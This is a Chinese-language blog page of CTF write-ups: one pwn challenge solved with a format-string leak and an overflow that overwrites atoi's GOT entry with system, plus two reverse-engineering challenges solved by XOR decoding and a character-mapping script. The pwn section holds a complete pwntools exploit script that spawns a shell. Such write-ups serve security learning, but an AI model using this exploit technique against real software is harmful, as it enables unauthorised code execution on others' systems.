<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="PWNnew-easypwnmain函数里看见这个程序实现增删查改的功能  进入ad函数需要输入num,name ,xize ,des四个变量，发现这里的for循环多循环了一次，存在offbyone漏洞，但是不急，继续往下看。  进入md函数发现所有的输入都没有限制长度，而且des_addr就在name的后面不远。所以我们可以通过覆盖来修改des_addr,修改其为一个危险函数的地址，从而进行调用">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2022/08/10/22.8.10xctf-pwn&re/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="PWNnew-easypwnmain函数里看见这个程序实现增删查改的功能  进入ad函数需要输入num,name ,xize ,des四个变量，发现这里的for循环多循环了一次，存在offbyone漏洞，但是不急，继续往下看。  进入md函数发现所有的输入都没有限制长度，而且des_addr就在name的后面不远。所以我们可以通过覆盖来修改des_addr,修改其为一个危险函数的地址，从而进行调用">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/zWY4kwLGyF8ZI1s.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/yimk9VOAHBFqzaC.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/tyXZ9NVB5h1jTRP.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/TgPvJUOAcIbhftN.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/om8Ff6yj2piP4D1.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/OPsYg6dQRyXqznv.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/10/LHAVlZrd57weuEz.png">
<meta property="article:published_time" content="2022-08-10T03:21:19.705Z">
<meta property="article:modified_time" content="2022-08-22T08:23:51.456Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/08/10/zWY4kwLGyF8ZI1s.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-22.8.10xctf-pwn&amp;re" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/08/10/22.8.10xctf-pwn&re/" class="article-date">
  <time datetime="2022-08-10T03:21:19.705Z" itemprop="datePublished">2022-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="new-easypwn"><a href="#new-easypwn" class="headerlink" title="new-easypwn"></a>new-easypwn</h2><p>main函数里看见这个程序实现增删查改的功能</p>
<p><img src="https://s2.loli.net/2022/08/10/zWY4kwLGyF8ZI1s.png"></p>
<p>进入ad函数需要输入num,name ,xize ,des四个变量，发现这里的for循环多循环了一次，存在offbyone漏洞，但是不急，继续往下看。</p>
<p><img src="https://s2.loli.net/2022/08/10/yimk9VOAHBFqzaC.png"></p>
<p>进入md函数发现所有的输入都没有限制长度，而且des_addr就在name的后面不远。所以我们可以通过覆盖来修改des_addr,修改其为一个危险函数的地址，从而进行调用</p>
<p><img src="https://s2.loli.net/2022/08/10/tyXZ9NVB5h1jTRP.png"></p>
<p>我们发现在menu函数里，每次都循环调用了一个atoi，我们打算通过md溢出覆盖des_addr为atoi_addr,然后用md的read函数修改atoi的内部为system。</p>
<p>所以我们就需要泄露libc的基地址和程序载入的基地址</p>
<p><img src="https://s2.loli.net/2022/08/10/TgPvJUOAcIbhftN.png"></p>
<p>在刚进入程序时发现栈中已经存在了一些有偏移的程序地址和libc地址，我们直接利用格式化字符串将其泄露出来，并且计算处所需函数的地址</p>
<pre><code>newnote(&quot;%12$p%13$p&quot;,&quot;0&quot;,128, &quot;0&quot;*16)#0
shownote(0)

process__libc = p.recvuntil(&quot;name&quot;,drop=True)[-29:-1]
process_base = int(process__libc[:14].ljust(8,b&#39;\x00&#39;),16) - 0x12a0#__libc_csu_init
libc__libc_start_main_off = libc.symbols[&quot;__libc_start_main&quot;]
leak = libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16)
libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16) - libc__libc_start_main_off - 240

print(&#39;leak:&#39;,hex(leak))
print(&#39;process_base:&#39;,hex(process_base))
print(&#39;libc_base:&#39;,hex(libc_base))


system = libc_base + libc.sym[&#39;system&#39;]
print(&#39;system:&#39;,hex(system))
atoi_got = hello.got[&#39;atoi&#39;]+process_base
print(&#39;atoi_got:&#39;,hex(atoi_got))</code></pre>
<p><img src="https://s2.loli.net/2022/08/10/om8Ff6yj2piP4D1.png"></p>
<p>然后通过溢出修改des_info_addr为atoi_addr,并且修改atoi内部为system</p>
<pre><code>overwrite_name_payload = b&quot;a&quot;*13 + p64(atoi_got)

editnote(0, &#39;0&#39;,overwrite_name_payload,p64(system)) #id,num,name,des

p.recvuntil(&#39;your choice&gt;&gt;&#39;)
p.sendline(&#39;/bin/sh&#39;)</code></pre>
<p><img src="https://s2.loli.net/2022/08/10/OPsYg6dQRyXqznv.png"></p>
<p>最后发送/bin/sh即可getshell</p>
<pre><code>#! /usr/bin/python3
from pwn import *
elf = ELF(&#39;./hello&#39;)
p = process(&#39;./hello&#39;)
#p = remote(&quot;61.147.171.105&quot;,53706)
hello = ELF(&#39;./hello&#39;)
#libc = ELF(&#39;./libc-2.23.so&#39;)
libc = elf.libc
# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
context.log_level = &#39;debug&#39;
#context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]


def newnote(number, name,size,des):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;1&#39;)
    p.recvuntil(&#39;phone number:&#39;)
    p.sendline(number)
    p.recvuntil(&#39;name:&#39;)
    p.sendline(name)
    p.recvuntil(&#39;size:&#39;)
    p.sendline(str(size))
    p.recvuntil(&#39;des info:&#39;)
    p.sendline(des)

def shownote(id):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;3&#39;)
    p.recvuntil(&#39;index:&#39;)
    p.sendline(str(id))

def editnote(id,num,name,des):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;4&#39;)
    p.recvuntil(&#39;index:&#39;)
    p.sendline(str(id))
    p.recvuntil(&#39;number:&#39;)
    p.sendline(num)
    p.recvuntil(&#39;name:&#39;)
    p.sendline(name)
    p.recvuntil(&#39;des info:&#39;)
    p.sendline(des)

def deletenote(id):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;2&#39;)
    p.recvuntil(&#39;index:&#39;)
    p.sendline(str(id))
gdb.attach(p)
#pause()# debug  0x2020A0
# leak process base libc base
newnote(&quot;%12$p%13$p&quot;,&quot;0&quot;,128, &quot;0&quot;*16)#0
shownote(0)

process__libc = p.recvuntil(&quot;name&quot;,drop=True)[-29:-1]
process_base = int(process__libc[:14].ljust(8,b&#39;\x00&#39;),16) - 0x12a0#__libc_csu_init
libc__libc_start_main_off = libc.symbols[&quot;__libc_start_main&quot;]
leak = libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16)
libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16) - libc__libc_start_main_off - 240

print(&#39;leak:&#39;,hex(leak))
print(&#39;process_base:&#39;,hex(process_base))
print(&#39;libc_base:&#39;,hex(libc_base))


system = libc_base + libc.sym[&#39;system&#39;]
print(&#39;system:&#39;,hex(system))
atoi_got = hello.got[&#39;atoi&#39;]+process_base
print(&#39;atoi_got:&#39;,hex(atoi_got))


overwrite_name_payload = b&quot;a&quot;*13 + p64(atoi_got)

editnote(0, &#39;0&#39;,overwrite_name_payload,p64(system)) #id,num,name,des

p.recvuntil(&#39;your choice&gt;&gt;&#39;)
p.sendline(&#39;/bin/sh&#39;)
p.interactive()

p.interactive()</code></pre>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><p>直接进入encode函数发现是个异或，我们只需要再异或一次就可以完成解密了</p>
<p><img src="https://s2.loli.net/2022/08/10/LHAVlZrd57weuEz.png"></p>
<p>利用脚本跑出结果</p>
<p>ord ： 取ascii码<br>append : 列表末尾添加元素</p>
<pre><code>enflag = &#39;izwhroz&quot;&quot;w&quot;v.K&quot;.Ni&#39;
key = 0x12
v = []
flag = []
for i in range (0,key , 3):
   a = (ord(enflag[i]) ^ key) -6
   b = (ord(enflag[i+1]) ^ key)  +6
   c = ord(enflag[i+2]) ^ 6 ^ key
   v.append(a)
   v.append(b)
   v.append(c)

for i in v :
    flag += chr(i)



print(flag)</code></pre>
<h2 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h2><p>根据字符串找到函数验证密码的位置，分析程序可以发现程序逻辑，exp如下：</p>
<pre><code>#include &lt;iostream&gt;
using namespace std;
int main()
&#123;
    char password[] = &#123; &quot;KanXueCTF2019JustForhappy&quot; &#125;;
    char key[] = &#123; &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot; &#125;;

    //cout &lt;&lt; sizeof(password) &lt;&lt; endl;
    for (int i = 0; i &lt; sizeof(password); i++)
    &#123;
        for (int j = 0; j &lt; sizeof(key); j++)
        &#123;
            if (key[j] == password[i])
            &#123;
                printf(&quot;%d &quot;, j);

            &#125;
        &#125;
    &#125;

    int pw[] = &#123; 19, 0, 27 ,59, 44, 4, 11, 55, 14, 30, 28, 29, 37, 18, 44, 42, 43, 14, 38, 41, 7, 0 ,39 ,39 ,48, 62 &#125;;
    int pw2[sizeof(pw)] = &#123;0&#125;;
    char str[50] = &#123;0&#125;;
    //57-48 = 9    字符
    //97-87 = 10       122-87 = 35   
    //65-29 = 36        90-29 = 61   

    int v5[] = &#123; 19, 0, 27 ,59, 44, 4, 11, 55, 14, 30, 28, 29, 37, 18, 44, 42, 43, 14, 38, 41, 7, 0 ,39 ,39 ,48, 62 &#125;;
    char Str[sizeof(v5)/4] = &quot;&quot;;
    cout &lt;&lt; sizeof(v5) / 4 &lt;&lt; endl;

    for (int i = 0; i &lt; sizeof(v5)/4; ++i)
    &#123;
        if (v5[i] + 48 &gt; 57 || v5[i] + 48 &lt; 48)           // 非数字
        &#123;
            if (v5[i] + 87 &gt; 122 || v5[i] + 87 &lt; 97)        // 非小写字母
            &#123;
                if (v5[i] + 29 &gt; 90 || v5[i] + 29 &lt; 65)       // 非大写字母
                    //Str[i] = v5[i] + 29;
                    ;
                else
                    Str[i] = v5[i] + 29;                  // 大写
            &#125;
            else
            &#123;
                Str[i] = v5[i] + 87;                    // 小写
            &#125;
        &#125;
        else
        &#123;
            Str[i]= v5[i] + 48;                      // 是数字
        &#125;
    &#125;
    for (int i = 0; i &lt;sizeof(v5)/4; i++)
    &#123;
        printf(&quot;%c&quot;, Str[i]);
    &#125;
    return 0;
&#125;</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/10/22.8.10xctf-pwn&re/" data-id="cl8plpiab0000g8v82tc8h8ni" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">记第一个GitHub项目 --ghost远控</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/08/10/22.8.10xctf-pwn&re/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/">记第一个GitHub项目 --ghost远控</a>
          </li>
        
          <li>
            <a href="/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/">buuctf&amp;&amp;攻防世界</a>
          </li>
        
          <li>
            <a href="/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">Web学习 文件包含漏洞</a>
          </li>
        
          <li>
            <a href="/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/">tcache结构体</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>